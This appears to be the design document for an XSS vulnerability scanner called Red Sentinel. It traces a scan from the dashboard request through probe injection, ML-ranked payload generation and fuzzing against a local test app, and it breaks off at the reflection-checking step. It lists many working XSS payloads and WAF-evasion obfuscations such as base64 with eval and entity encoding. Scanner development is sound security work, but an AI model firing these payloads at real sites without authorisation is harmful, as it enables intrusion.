# Red Sentinel — Complete Data Flow Report

> **Purpose**: Trace every byte of data from user input to final report, with **exact payloads, URLs, HTTP responses, DB records, and internal data structures** at every step.
>
> **Audience**: Engineers who need to understand what flows where, when, and in what shape.

---

## Table of Contents

1. [High-Level Architecture](#1-high-level-architecture)
2. [Step 0: Dataset & Training Pipeline](#2-step-0-dataset--training-pipeline)
3. [Step 1: User Initiates a Scan](#3-step-1-user-initiates-a-scan)
4. [Step 2: Dashboard → API Gateway](#4-step-2-dashboard--api-gateway)
5. [Step 3: Core Scan Controller & Queue](#5-step-3-core-scan-controller--queue)
6. [Step 4: Crawl Phase — Endpoint Discovery](#6-step-4-crawl-phase--endpoint-discovery)
7. [Step 5: Context Phase — Probe Injection & Classification](#7-step-5-context-phase--probe-injection--classification)
8. [Step 6: Payload Generation Phase](#8-step-6-payload-generation-phase)
9. [Step 7: Fuzzing Phase — HTTP Sending](#9-step-7-fuzzing-phase--http-sending)
10. [Step 8: Reflection Checking](#10-step-8-reflection-checking)
11. [Step 9: DOM XSS Scanning](#11-step-9-dom-xss-scanning)
12. [Step 10: Browser Verification](#12-step-10-browser-verification)
13. [Step 11: Severity Scoring & Risk Calculus](#13-step-11-severity-scoring--risk-calculus)
14. [Step 12: Report Generation](#14-step-12-report-generation)
15. [Step 13: Runtime Training Data Collection](#15-step-13-runtime-training-data-collection)
16. [Step 14: Evaluation Pipeline](#16-step-14-evaluation-pipeline)
17. [Full Concrete Walkthrough](#17-full-concrete-walkthrough)

---

## 1. High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                         USER (Browser / CLI)                        │
│  Input: https://example.com/search?q=<payload>                      │
│  Options: singlePage=true, depth=2, verifyExecution=true            │
└──────────┬──────────────────────────────────────────────────────────┘
           │ HTTP POST /api/scans
           ▼
┌─────────────────────────────────────────────────────────────────────┐
│                    DASHBOARD (Next.js / React)                       │
│  lib/api.ts → createScan()                                          │
│  Components: NewScanForm, ScanTable, VulnList, ActivityFeed         │
│  WebSocket: ScanGateway (ws://localhost:4000)                       │
└──────────┬──────────────────────────────────────────────────────────┘
           │ HTTP POST http://localhost:4000/api/scans
           ▼
┌─────────────────────────────────────────────────────────────────────┐
│                  CORE API (NestJS — http://localhost:4000)           │
│                                                                     │
│  scan.controller.ts → scan.service.ts → scan.producer.ts (BullMQ)  │
│                                                                     │
│  ┌──────────────┐   ┌────────────────┐   ┌──────────────────────┐  │
│  │ ScanGateway   │   │ ScanService    │   │ ScanProcessor (Worker)│  │
│  │ (WebSocket)   │   │ (business      │   │ (orchestrates phases)│  │
│  │               │   │  logic)        │   │                      │  │
│  └──────────────┘   └────────────────┘   └──────────────────────┘  │
│                                                                     │
│  Phases: AUTH → CRAWL → CONTEXT → PAYLOAD_GEN → FUZZ → REPORT      │
└──────────┬──────────────────────────────────────────────────────────┘
           │ HTTP calls to microservices
           ▼
┌─────────────────────────────────────────────────────────────────────┐
│                    MODULES (Python Microservices)                    │
│                                                                     │
│  ┌──────────────────┐   ┌──────────────────┐   ┌───────────────┐   │
│  │ Context Module    │   │ Payload Gen      │   │ Fuzzer Module │   │
│  │ :5001             │   │ Module :5002     │   │ :5003         │   │
│  │                   │   │                  │   │               │   │
│  │ probe_injector.py │   │ bank.py          │   │ http_sender.py│   │
│  │ char_fuzzer.py    │   │ selector.py      │   │ reflection_   │   │
│  │ html_parser.py    │   │ obfuscator.py    │   │ checker.py    │   │
│  │ ai_classifier.py  │   │ xgboost_ranker.py│   │ dom_xss_      │   │
│  └────────┬─────────┘   └────────┬─────────┘   │ scanner.py    │   │
│           │                      │              │ browser_      │   │
│           │                      │              │ verifier.py   │   │
│           │                      │              └───────┬───────┘   │
│           │                      │                      │           │
└───────────┼──────────────────────┼──────────────────────┼───────────┘
            │                      │                      │
            ▼                      ▼                      ▼
     Target Web App         Target Web App          Target Web App
     (e.g. http://          (e.g. http://           (e.g. http://
      localhost:9090)         localhost:9090)          localhost:9090)
```

---

## 2. Step 0: Dataset & Training Pipeline

This runs **offline** (not per-scan) and produces the payload bank and ML models.

### 2.1 Data Sources

| Source | Payloads | Provenance |
|--------|----------|------------|
| GitHub AwesomeXSS | 52 files | Cloned from s0md3v/AwesomeXSS (commit `998270e`) |
| GitHub PayloadsAllTheThings | 613 files | Cloned from swisskyrepo/PayloadsAllTheThings (commit `e961fef`) |
| GitHub XSSGAI | 74 files | Cloned from AnonKryptiQuz/XSSGAI (commit `39c2297`) |
| PortSwigger Cheat Sheet | 526 rows | Scraped HTML from portswigger.net |
| Synthetic payloads | 42,212 rows | Generated by `generate_synthetic.py` |

### 2.2 Pipeline Order (from `dataset_manifest.json`)

```
1. collect_payloads.py    → 19,015 raw payloads → all_payloads_raw.csv
2. collect_portswigger.py → 526 PortSwigger    → portswigger_payloads.csv
3. label_contexts.py      → Label contexts      → payloads_labeled.csv (19,015 rows)
4. generate_synthetic.py  → 42,212 synthetic    → synthetic_payloads.csv
5. finalize_dataset.py    → Train/Val/Test split → splits/train.csv (41,385 rows)
                                                    splits/val.csv (8,868 rows)
                                                    splits/test.csv (8,869 rows)
```

### 2.3 Concrete Labeled Payload Examples

From `dataset/processed/payloads_labeled.csv`:

```
 #  payload                                      context              technique  severity  length
—   ————-                                      ———————              ———————    ——————    ——————
#1  "<script>alert(1)</script>"                  script_injection     none       medium    26
#2  "<img src=x onerror=alert(1)>"               tag_injection        none       medium    38
#3  "<svg onload=alert(1)>"                      tag_injection        none       medium    27
#4  "javascript:alert(1)"                        js_uri               none       medium    22
#5  "';alert(1)//"                                attribute_escape     none       medium    13
#6  "{{constructor.constructor('alert(1)')()}}"   template_injection   none       medium    43
#7  "alert(1)"                                    dom_sink             none       medium    8
```

### 2.4 Context Categories (8 classes)

| Class | ID | Example Payload |
|-------|-----|-----------------|
| `script_injection` | 0 | `<script>alert(1)</script>` |
| `event_handler` | 1 | `<img src=x onerror=alert(1)>` |
| `js_uri` | 2 | `javascript:alert(1)` |
| `tag_injection` | 3 | `<svg onload=alert(1)>` |
| `template_injection` | 4 | `{{constructor.constructor('alert(1)')()}}` |
| `dom_sink` | 5 | `alert(1)` |
| `attribute_escape` | 6 | `";alert(1)//` |
| `generic` | 7 | `';alert(1)//` |

### 2.5 Payload Length Distribution

| Split | Min | Max | Mean | Median |
|-------|-----|-----|------|--------|
| Train | 1 | 2,147 | ~58 | ~42 |
| Val | 1 | 2,147 | ~58 | ~42 |
| Test | 1 | 2,147 | ~58 | ~42 |

### 2.6 ML Model Training

**Tokenizer**: BPE tokenizer trained on `dataset/splits/train_payloads.txt` (42,127 payloads).

**XGBoost Ranker** (at `model/ranker/xgboost_ranker.json`):
- Trained on `dataset/ranker_training/ranker_training_samples.jsonl` (9,012 samples, growing)
- Features: payload length, character diversity, HTML tag count, event handler count, encoding layers, context match score, etc.
- Output: `confidence_score` (0.0 to 1.0) for each payload
- **Runtime feedback**: Every scan appends new labeled samples to the training file via `training_collector.py` — see [§15 Runtime Training Data Collection](#15-step-13-runtime-training-data-collection) for the full feedback loop

**XSS Classifier** (`model/xss_classifier.py`):
- Architecture: LSTM + Attention
- Input: Tokenized payload (max_length=128)
- Output: 8-class probability distribution
- Checkpoints at `model/checkpoints/`

### 2.7 Concrete Ranker Training Sample

From `dataset/ranker_training/ranker_training_samples.jsonl`:

```json
{
  "timestamp": "2026-05-18T12:09:12.604191",
  "url": "https://xss-game.appspot.com/level1/frame",
  "payload_text": "\"><svg\n onload=alert()>",
  "target_param": "query",
  "context": "html_body",
  "waf": "none",
  "technique": "mutated",
  "severity": "medium",
  "allowed_chars": ["<", ">", "\"", "'", "/", "\\", "(", ")", "{", "}", ";", "=", "`", "&", "|"],
  "response_snippet": "...<div> Sorry, no results were found for <b>\"><svg onload=alert()></b>...",
  "executed": true,
  "dialog_triggered": true,
  "reflected": true,
  "exact_match": true,
  "reflection_position": "html_body",
  "success": true
}
```

---

## 3. Step 1: User Initiates a Scan

### 3.1 Dashboard UI — NewScanForm

**Component**: `dashboard/components/new-scan-form.tsx`

**User fills in**:

| Field | Value |
|-------|-------|
| Target URL | `http://localhost:9090/reflected/body?q=test` |
| Scan Mode | `singlePage` (vs `recursive`) |
| Verify Execution | `true` |
| Max Payloads Per Param | `50` |
| Timeout | `30000` ms |
| WAF Bypass | `false` |

### 3.2 API Call from Dashboard

**File**: `dashboard/lib/api.ts`

```typescript
// Concrete request
const response = await fetch('http://localhost:4000/api/scans', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    url: 'http://localhost:9090/reflected/body?q=test',
    options: {
      singlePage: true,
      maxParams: 10,
      verifyExecution: true,
      maxPayloadsPerParam: 50,
      timeout: 30000,
    }
  })
});

// Concrete response (scan created)
{
  "id": "62587fda-d7d2-4545-ad2b-321ab30c28a4",   // ← UUIDv4
  "url": "http://localhost:9090/reflected/body?q=test",
  "status": "PENDING",
  "progress": 0,
  "phase": "CRAWL",
  "createdAt": "2026-05-21T10:30:00.000Z"
}
```

---

## 3.3 Auth Phase — Credential Injection

When scanning authenticated targets, the AUTH phase runs **before** CRAWL and handles credential injection.

**Concrete flow**:

```json
// Input from user (optional, passed with scan options)
{
  "url": "http://localhost:9090/admin/users?name=test",
  "options": {
    "auth": {
      "type": "cookie",
      "cookie": "session=abc123def456",
      "username": "admin",
      "password": "admin123"
    }
  }
}

// Internally:
// 1. If cookie provided, store in axios/httpx session headers
// 2. If username+password, POST to /login first:
//    POST http://localhost:9090/login
//    Body: {"username":"admin","password":"admin123"}
//    Response: Set-Cookie: session=abc123def456; HttpOnly
// 3. Session cookie is attached to all subsequent requests
// 4. All phases (crawl, context, fuzz) reuse this authenticated session
```

**Key detail**: The auth phase is **optional**. If no auth credentials are supplied, it is skipped entirely and the scan proceeds with unauthenticated requests.

---

## 3.4 WebSocket Connection Flow

**File**: `dashboard/hooks/use-scan-socket.ts`

The dashboard establishes a persistent WebSocket connection to receive real-time scan status updates.

**Concrete connection lifecycle**:

```typescript
// 1. Dashboard connects on app mount
const ws = new WebSocket('ws://localhost:4000');
// → Connection: ws://localhost:4000

// 2. After scan creation, subscribe to scan events
ws.send(JSON.stringify({
  event: 'subscribe',
  data: { scanId: '62587fda-d7d2-4545-ad2b-321ab30c28a4' }
}));

// 3. Receive real-time events (emitted by core/src/scan/scan.gateway.ts)
ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  // msg = {"event":"scan.update","data":{"scanId":"...","status":"FUZZING","progress":75,"phase":"FUZZ"}}
  
  switch (msg.event) {
    case 'scan.update':
      setProgress(msg.data.progress);
      setPhase(msg.data.phase);
      break;
    case 'scan.vuln':
      addVuln(msg.data.vuln);
      // vuln = {param: "q", type: "reflected_xss", severity: "HIGH"}
      break;
    case 'scan.done':
      setStatus('DONE');
      ws.close();
      break;
    case 'scan.error':
      setError(msg.data.message);
      break;
  }
};

// 4. Reconnection logic (on unexpected disconnect)
ws.onclose = () => {
  setTimeout(() => {
    reconnect();  // retry with exponential backoff
  }, 1000);
};
```

**Concrete event sequence for a full scan**:

```
→ {"event":"subscribe","data":{"scanId":"62587fda-..."}}
← {"event":"scan.update","data":{"scanId":"62587fda-...","status":"CRAWLING","progress":5,"phase":"CRAWL"}}
← {"event":"scan.update","data":{"scanId":"62587fda-...","status":"ANALYZING","progress":25,"phase":"CONTEXT"}}
← {"event":"scan.vuln","data":{"scanId":"62587fda-...","vuln":{"param":"q","type":"reflected_xss","severity":"HIGH"}}}
← {"event":"scan.update","data":{"scanId":"62587fda-...","status":"GENERATING","progress":50,"phase":"PAYLOAD_GEN"}}
← {"event":"scan.update","data":{"scanId":"62587fda-...","status":"FUZZING","progress":75,"phase":"FUZZ"}}
← {"event":"scan.vuln","data":{"scanId":"62587fda-...","vuln":{"param":"q","type":"reflected_xss","severity":"CRITICAL"}}}
← {"event":"scan.update","data":{"scanId":"62587fda-...","status":"REPORTING","progress":90,"phase":"REPORT"}}
← {"event":"scan.done","data":{"scanId":"62587fda-...","status":"DONE","progress":100}}
```

---

## 4. Step 2: Dashboard → API Gateway

**Already covered above**:
- **§3.2** — The concrete POST request and response from dashboard to core API
- **§3.4** — The WebSocket connection lifecycle for real-time updates

---

## 5. Step 3: Core Scan Controller & Queue

### 5.1 Controller Entry Point

**File**: `core/src/scan/scan.controller.ts`

```typescript
@Post()
async createScan(@Body() dto: CreateScanDto): Promise<ScanSummaryDto> {
  // dto = {
  //   url: "http://localhost:9090/reflected/body?q=test",
  //   options: { singlePage: true, maxPayloadsPerParam: 50, ... }
  // }
  
  const scan = await this.scanService.create(dto);
  // Returns: { id: "62587fda-...", url: "...", status: "PENDING", ... }
  
  await this.scanQueueProducer.enqueue(scan.id);
  // Pushes to BullMQ Redis queue: { scanId: "62587fda-..." }
  
  return scan;
}
```

### 5.2 Scan Entity (Database Record)

**File**: `core/src/scan/entities/scan.entity.ts`

```typescript
@Entity('scans')
export class ScanEntity {
  @PrimaryGeneratedColumn('uuid')
  id: string;                        // "62587fda-d7d2-4545-ad2b-321ab30c28a4"

  @Column()
  url: string;                       // "http://localhost:9090/reflected/body?q=test"

  @Column({ type: 'enum', enum: ScanStatus, default: ScanStatus.PENDING })
  status: ScanStatus;                // "PENDING" → "CRAWLING" → ... → "DONE"

  @Column({ type: 'enum', enum: ScanPhase, nullable: true })
  phase: ScanPhase;                  // "CRAWL" → "CONTEXT" → "PAYLOAD_GEN" → "FUZZ" → "REPORT"

  @Column({ default: 0 })
  progress: number;                  // 0 → 10 → 25 → 50 → 75 → 90 → 100

  @Column('jsonb', { nullable: true })
  options: ScanOptions;              // { singlePage: true, maxPayloadsPerParam: 50, ... }

  @Column({ nullable: true })
  userId: string;                    // UUID of user who created scan

  @CreateDateColumn()
  createdAt: Date;                   // "2026-05-21T10:30:00.000Z"

  @UpdateDateColumn()
  updatedAt: Date;                   // "2026-05-21T10:30:05.000Z"

  @Column({ nullable: true })
  completedAt?: Date;                // "2026-05-21T10:31:00.000Z"

  @Column({ nullable: true })
  error?: string;                    // null (or error message if failed)
}
```

### 5.3 BullMQ Queue

**Producer** (`core/src/queue/scan.producer.ts`):
```typescript
async enqueue(scanId: string) {
  await this.queue.add('scan', { scanId }, {
    jobId: scanId,
    attempts: 3,
    backoff: { type: 'exponential', delay: 2000 },
  });
  // Redis: LPUSH bull:scan:queue '{"scanId":"62587fda-..."}'
}
```

**Processor** (`core/src/queue/scan.processor.ts`):
```typescript
async process(job: Job<{ scanId: string }>) {
  const { scanId } = job.data;
  // scanId = "62587fda-d7d2-4545-ad2b-321ab30c28a4"
  
  await this.updateStatus(scanId, ScanStatus.CRAWLING, ScanPhase.CRAWL, 5);
  
  // Phase 1: CRAWL → discover endpoints
  const endpoints = await this.crawlerService.crawl(scan.url, scan.options);
  
  await this.updateStatus(scanId, ScanStatus.ANALYZING, ScanPhase.CONTEXT, 25);
  
  // Phase 2: CONTEXT → classify reflection contexts
  const contextResults = await this.fuzzerClient.analyzeContext(endpoints);
  
  // Phase 3: PAYLOAD_GEN → generate targeted payloads
  const payloads = await this.fuzzerClient.generatePayloads(contextResults);
  
  await this.updateStatus(scanId, ScanStatus.FUZZING, ScanPhase.FUZZ, 75);
  
  // Phase 4: FUZZ → fire payloads, detect XSS
  const fuzzResults = await this.fuzzerClient.fuzz(endpoints, payloads);
  
  await this.updateStatus(scanId, ScanStatus.REPORTING, ScanPhase.REPORT, 90);
  
  // Phase 5: REPORT → score, enrich, persist
  const report = await this.reportService.generate(scanId, fuzzResults);
  
  await this.updateStatus(scanId, ScanStatus.DONE, null, 100);
}
```

---

## 6. Step 4: Crawl Phase — Endpoint Discovery

### 6.1 Crawler Service

**File**: `core/src/crawler/crawler.service.ts`

For **single-page** scans: extracts parameters from the provided URL directly.

For **recursive** scans: spiders the target site, discovers forms, links, and API endpoints.

**Concrete Input/Output**:

```typescript
// Input
const url = "http://localhost:9090/reflected/body?q=test";
const options = { singlePage: true, maxParams: 10, depth: 2 };

// Output
const endpoints = [
  {
    url: "http://localhost:9090/reflected/body",
    params: ["q"],
    method: "GET",
    source: "url",
    examples: { q: "test" }
  }
];
```

For **recursive** crawl (if `singlePage: false`):

```typescript
// Output (discovering all /reflected/* endpoints)
const endpoints = [
  { url: "http://localhost:9090/reflected/body", params: ["q"], method: "GET" },
  { url: "http://localhost:9090/reflected/attribute", params: ["user"], method: "GET" },
  { url: "http://localhost:9090/reflected/script", params: ["name"], method: "GET" },
  { url: "http://localhost:9090/reflected/event", params: ["val"], method: "GET" },
  { url: "http://localhost:9090/reflected/href", params: ["url"], method: "GET" },
  // ... more endpoints
  { url: "http://localhost:9090/dom/innerhtml", params: ["data"], method: "GET" },
  { url: "http://localhost:9090/dom/eval", params: ["expr"], method: "GET" },
  { url: "http://localhost:9090/stored/comments", params: ["name","body"], method: "POST" }
];
```

---

## 7. Step 5: Context Phase — Probe Injection & Classification

### 7.1 Probe Injection

**File**: `modules/context-module/probe_injector.py`

For each parameter, a **unique MD5-based probe marker** is injected into the URL.

> **Uniqueness guarantee**: The probe marker uses the first 8 hex characters of the MD5 hash = 32 bits of entropy = ~4.3 billion possible values. For a scan with 100 parameters, the probability of any collision is ~1.2 × 10⁻⁶ (essentially negligible). Even with 10,000 parameters across multiple scans, collision probability stays below 1%.

**Concrete Example**:

```python
# Input
url = "http://localhost:9090/reflected/body"
param = "q"

# Step 1: Generate unique marker
salt = "redsentinel"
raw = f"{salt}:{param}"        # "redsentinel:q"
digest = hashlib.md5(raw.encode()).hexdigest()[:8]  # "a1b2c3d4"
marker = f"rs0x{digest}"       # "rs0xa1b2c3d4"  ← UNIQUE PROBE

# Step 2: Build probe URL
#    urlparse("http://localhost:9090/reflected/body")
#    → qs["q"] = ["rs0xa1b2c3d4"]
#    → urlunparse → "http://localhost:9090/reflected/body?q=rs0xa1b2c3d4"

probe_url = "http://localhost:9090/reflected/body?q=rs0xa1b2c3d4"
```

### 7.2 HTTP Probe (GET + POST)

```python
# GET request
response = httpx.get("http://localhost:9090/reflected/body?q=rs0xa1b2c3d4")
# response.status_code = 200
# response.text contains: "...Sorry, no results were found for <b>rs0xa1b2c3d4</b>..."

# POST request (also tried for form fields)
response = httpx.post("http://localhost:9090/reflected/body", data={"q": "rs0xa1b2c3d4"})
# response.status_code = 200
# response.text also contains the marker
```

### 7.3 Reflection Detection

The probe injector checks if the marker appears in the response body:

```python
# The marker "rs0xa1b2c3d4" IS found in response body
# → This parameter REFLECTS!
# Prefer whichever method (GET or POST) reflected the marker

results = {
  "q": {
    "marker": "rs0xa1b2c3d4",
    "status_code": 200,
    "body": "<html>...Sorry, no results were found for <b>rs0xa1b2c3d4</b>...</html>",
    "headers": {"Content-Type": "text/html; charset=utf-8", ...},
    "probe_method": "get"
  }
}
```

### 7.4 Context Classification via Char Fuzzing

**File**: `modules/context-module/char_fuzzer.py`

Fires special probe characters to determine *where* the reflection lands:

```python
# Fires special characters one by one
special_chars = ['"', "'", "<", ">", "`", "{", "}", ";", "/", "\\", "(", ")"]

# For each char, builds a URL and checks the reflection position
for char in special_chars:
    probe_url = f"http://localhost:9090/reflected/body?q=XXX{char}YYY"
    response = httpx.get(probe_url)
    # Parse HTML to find where "XXX{char}YYY" appears in the DOM tree
```

**HTML Parser** (`modules/context-module/html_parser.py`) locates the reflection in the DOM tree:

```python
# Reflected value "<b>XXX<YYY</b>" found inside a <b> tag within HTML body
# → context = "html_body"

# For attribute reflection: value='"' found inside href="..." attribute
# → context = "attribute"

# For script reflection: value=';alert(1)//' found inside <script> tag
# → context = "script"
```

### 7.5 AI Classifier Refinement

**File**: `modules/context-module/ai_classifier.py`

When char fuzzing is ambiguous, the AI classifier (loaded from `model/xss_classifier.py`) analyzes the response HTML:

```python
# Input: response snippet around reflection point
snippet = '<div> Sorry, no results were found for <b>[REFLECTION_HERE]</b>.'

# Feature extraction:
# - Which HTML tag contains the reflection? → <b> inside <div>
# - Is it inside an attribute? → No
# - Is it inside <script>? → No
# - Is it inside a comment? → No
# - Is it URL-encoded? → No

prediction = classifier.predict(snippet)
# → "html_body" with confidence 0.97
```

### 7.6 Full Context Analysis Result

```json
{
  "endpoint": "http://localhost:9090/reflected/body?q=test",
  "params": [
    {
      "name": "q",
      "reflects": true,
      "context": "html_body",
      "context_confidence": 0.97,
      "reflection_position": "html_body",
      "probe_marker": "rs0xa1b2c3d4",
      "probe_method": "get",
      "char_fuzz_results": {
        "<": "escaped_to_&lt;",
        ">": "escaped_to_&gt;",
        "\"": "escaped_to_&quot;",
        "'": "escaped_to_&#39;"
      },
      "allowed_chars": ["<", ">", "\"", "'", "/", "\\", "(", ")", "{", "}", ";", "=", "`", "&", "|"]
    }
  ]
}
```

---

## 8. Step 6: Payload Generation Phase

### 8.1 What Gets Sent to Payload Gen Module

```json
POST http://localhost:5002/generate
{
  "endpoint_url": "http://localhost:9090/reflected/body",
  "context": "html_body",
  "params": {
    "q": {
      "reflects": true,
      "allowed_chars": ["<", ">", "\"", "'", "/", "\\", "(", ")", "{", "}", ";", "=", "`", "&", "|"]
    }
  },
  "max_payloads": 50,
  "waf_bypass": false
}
```

### 8.2 Payload Bank Lookup

**File**: `modules/payload-gen-module/bank.py`

The bank contains thousands of payloads indexed by context. For `html_body`:

```python
html_body_payloads = [
    #1 ("<script>alert(1)</script>", "original", "medium"),
    #2 ("<img src=x onerror=alert(1)>", "original", "medium"),
    #3 ("<svg onload=alert(1)>", "original", "medium"),
    #4 ("<body onload=alert(1)>", "original", "medium"),
    #5 ("<script>prompt(1)</script>", "original", "medium"),
    #6 ("javascript:alert(1)", "original", "medium"),
    # ... hundreds more, including:
    #7 ("<svg////////onload=alert(1)>", "mutated", "medium"),
    #8 ("<img src/onerror=alert(1)>", "mutated", "medium"),
    #9 ("<BODY ONLOAD=alert(8839)>", "case_variation", "medium"),
    #10 ("<img src=x onerror=alert(String.fromCharCode(88,83,83))>", "encoding|case_variation", "high"),
    #11 ("%3cimg onerror=alert(1) src=a%3e", "url_encoding", "medium"),
    # ...
]
```

### 8.3 XGBoost Ranker Scoring

**File**: `modules/payload-gen-module/xgboost_ranker.py`

Each candidate payload is scored by the trained XGBoost model:

```python
# Feature extraction for each payload:
payload = "<img src=x onerror=alert(1)>"
features = {
    "length": 38,
    "has_script_tag": 0,
    "has_img_tag": 1,
    "has_svg_tag": 0,
    "has_onerror": 1,
    "has_onload": 0,
    "has_event_handler": 1,
    "has_javascript_uri": 0,
    "has_template_syntax": 0,
    "has_html_entity": 0,
    "has_url_encoding": 0,
    "has_case_variation": 0,
    "num_encoding_layers": 0,
    "char_diversity": 0.72,
    "context_match_score": 0.95,  # matches html_body context
}

score = xgb_model.predict(features)  # → 0.89 (high confidence)
```

**Concrete ranking output**:

```python
ranked_payloads = [
    #1 ("<img src=x onerror=alert(1)>", 0.89, "original", "medium"),
    #2 ("<svg onload=alert(1)>", 0.87, "original", "medium"),
    #3 ("<script>alert(1)</script>", 0.85, "original", "medium"),
    #4 ("<body onload=alert(1)>", 0.82, "original", "medium"),
    #5 ("<BODY ONLOAD=alert(8839)>", 0.78, "case_variation", "medium"),
    #6 ("<svg////////onload=alert(1)>", 0.76, "mutated", "medium"),
    #7 ("<img src/onerror=alert(1)>", 0.74, "mutated", "medium"),
    #8 ("<img src=x onerror=alert(String.fromCharCode(88,83,83))>", 0.71, "encoding|case_variation", "high"),
    #9 ("%3cimg onerror=alert(1) src=a%3e", 0.65, "url_encoding", "medium"),
    #10 ("javascript:alert(1)", 0.60, "original", "medium"),
    # ... up to max_payloads (50)
]
```

### 8.4 Selector — Context-Aware Filtering

**File**: `modules/payload-gen-module/selector.py`

Filters payloads by:
1. **Context match**: Only payloads whose context tag matches `html_body`
2. **Allowed chars**: If WAF or char restrictions detected, filter incompatible payloads
3. **Diversity**: Ensures variety in technique (original, mutated, case_variation, encoding, url_encoding)

```python
selected = [
    #1  {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 0.89, "technique": "original", "severity": "medium"},
    #2  {"payload": "<svg onload=alert(1)>", "target_param": "q", "confidence": 0.87, "technique": "original", "severity": "medium"},
    #3  {"payload": "<script>alert(1)</script>", "target_param": "q", "confidence": 0.85, "technique": "original", "severity": "medium"},
    #4  {"payload": "<BODY ONLOAD=alert(8839)>", "target_param": "q", "confidence": 0.78, "technique": "case_variation", "severity": "medium"},
    #5  {"payload": "<svg////////onload=alert(1)>", "target_param": "q", "confidence": 0.76, "technique": "mutated", "severity": "medium"},
    #6  {"payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>", "target_param": "q", "confidence": 0.71, "technique": "encoding|case_variation", "severity": "high"},
    #7  {"payload": "%3cimg onerror=alert(1) src=a%3e", "target_param": "q", "confidence": 0.65, "technique": "url_encoding", "severity": "medium"},
]
```

### 8.5 Obfuscator (if WAF Bypass Enabled)

**File**: `modules/payload-gen-module/obfuscator.py`

If `waf_bypass: true`, payloads are obfuscated:

```python
# Original: <img src=x onerror=alert(1)>
# Obfuscated variants:
obfuscated = [
    "<img src=x onerror=\u0061lert(1)>",                          # unicode escape
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",             # base64 + eval
    "<Img SrC=x OnErRoR=alert(1)>",                              # mixed case
    "<img%20src=x%20onerror=alert(1)>",                           # URL encoding
    "<img/*comment*/src=x/*comment*/onerror=alert(1)>",           # HTML comments
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",       # HTML entities
    "<img src=x onerror=\\x61lert(1)>",                           # hex escape
]
```

---

## 9. Step 7: Fuzzing Phase — HTTP Sending

### 9.1 What Gets Sent to Fuzzer Module

```json
POST http://localhost:5003/fuzz
{
  "url": "http://localhost:9090/reflected/body",
  "payloads": [
    #1  {"payload": "<img src=x onerror=alert(1)>", "target_param": "q", "confidence": 0.89, "technique": "original", "severity": "medium"},
    #2  {"payload": "<svg onload=alert(1)>", "target_param": "q", "confidence": 0.87, "technique": "original", "severity": "medium"},
    #3  {"payload": "<script>alert(1)</script>", "target_param": "q", "confidence": 0.85, "technique": "original", "severity": "medium"},
    #4  {"payload": "<BODY ONLOAD=alert(8839)>", "target_param": "q", "confidence": 0.78, "technique": "case_variation", "severity": "medium"},
    #5  {"payload": "<svg////////onload=alert(1)>", "target_param": "q", "confidence": 0.76, "technique": "mutated", "severity": "medium"},
    #6  {"payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>", "target_param": "q", "confidence": 0.71, "technique": "encoding|case_variation", "severity": "high"},
    #7  {"payload": "%3cimg onerror=alert(1) src=a%3e", "target_param": "q", "confidence": 0.65, "technique": "url_encoding", "severity": "medium"}
  ],
  "verify_execution": true,
  "timeout": 60000,
  "stored_mode": false
}
```

### 9.2 HTTP Sender

**File**: `modules/fuzzer-module/http_sender.py`

For each payload, constructs the HTTP request:

```python
# Payload 1: <img src=x onerror=alert(1)>
url = "http://localhost:9090/reflected/body?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
# (URL-encoded for safe transport)

response = httpx.get(url, timeout=30, follow_redirects=True)
```

**Concrete HTTP request/response**:

```http
GET /reflected/body?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E HTTP/1.1
Host: localhost:9090
User-Agent: Mozilla/5.0 (compatible; RedSentinel/1.0)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 342

<!DOCTYPE html>
<html>
<head><title>Reflected XSS — Body Context</title></head>
<body>
  <h1>Reflected XSS Test — Body Context</h1>
  <p>You entered: <b><img src=x onerror=alert(1)></b></p>
  <p><a href="/">Back</a></p>
</body>
</html>
```

**Raw result for each payload**:

```json
{
  "payload": "<img src=x onerror=alert(1)>",
  "target_param": "q",
  "url_sent": "http://localhost:9090/reflected/body?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
  "status_code": 200,
  "response_headers": {"Content-Type": "text/html; charset=utf-8", ...},
  "response_body": "<!DOCTYPE html>...<b><img src=x onerror=alert(1)></b>...",
  "response_snippet": "...<b><img src=x onerror=alert(1)></b>...",
  "reflected": false,   // ← set by reflection checker
  "executed": false,    // ← set by browser verifier
  "vuln": false,        // ← set after all checks
  "evidence": {}
}
```

---

## 10. Step 8: Reflection Checking

### 10.1 Reflection Checker

**File**: `modules/fuzzer-module/reflection_checker.py`

Checks if the payload appears (reflected) in the response body:

```python
payload = "<img src=x onerror=alert(1)>"
response_body = "...<b><img src=x onerror=alert(1)></b>..."

# Exact match check (does the raw payload text appear?)
is_exact_match = payload in response_body  # → True

# If not exact, try normalized check (decode entities, normalize whitespace)
normalized_payload = normalize(payload)     # "<img src=x onerror=alert(1)>"
normalized_body = normalize(response_body)  # "...<b><img src=x onerror=alert(1)></b>..."
is_reflected = normalized_payload in normalized_body  # → True

# Determine reflection position
position = detect_reflection_position(response_body, payload)
# → "html_body" (found inside <b> tag in body)

# Also checks for:
# - URL-decoded reflection
# - HTML-entity decoded reflection
# - Case-varied reflection
# - Partial reflection
```

### 10.2 Context-Specific Filtering

For `javascript:` URI payloads, a specialized filter (`is_js_uri_safe_in_context`) validates if the context is safe:

```python
# From tests/test_tier2_js_uri_filter.py
def test_javascript_uri_in_href_is_dangerous():
    payload = "javascript:alert(1)"
    assert is_js_uri_safe_in_context(payload, "attribute", "href") == False
    # → FALSE means DANGEROUS (not safe)

def test_javascript_uri_in_body_is_often_safe():
    payload = "javascript:alert(1)"
    assert is_js_uri_safe_in_context(payload, "html_body", None) == True
    # → TRUE means SAFE (javascript: in body context doesn't execute)
```

### 10.3 Reflection Check Results

```json
{
  "payload": "<img src=x onerror=alert(1)>",
  "reflected": true,
  "exact_match": true,
  "reflection_position": "html_body",
